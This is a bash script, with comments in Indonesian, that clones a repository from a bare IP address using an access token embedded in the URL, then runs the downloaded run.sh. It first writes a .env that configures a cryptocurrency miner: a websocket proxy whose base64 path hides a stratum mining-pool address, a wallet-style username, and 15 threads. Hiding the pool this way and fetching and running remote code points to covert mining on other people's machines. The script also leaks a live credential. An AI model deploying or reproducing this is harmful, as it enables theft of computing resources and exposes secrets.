#!/bin/bash
set -e

# Folder repo
REPO_URL="http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git"
FOLDER_NAME="python-app"

# Clone repo jika belum ada
if [ ! -d "$FOLDER_NAME" ]; then
    echo "Cloning repository..."
    git clone "$REPO_URL"
else
    echo "Folder $FOLDER_NAME sudah ada, skip cloning."
fi

cd "$FOLDER_NAME"

# Bersihkan line ending
if [ -f "run.sh" ]; then
    sed -i 's/\r$//' run.sh
else
    echo "run.sh tidak ditemukan!"
    exit 1
fi

# Buat .env otomatis
cat > .env <<EOL
proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=
host=127.0.0.1
port=3036
username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.dytn
password=x
threads=15
EOL

# Eksekusi run.sh
chmod +x run.sh
echo "Menjalankan run.sh..."
./run.sh 2
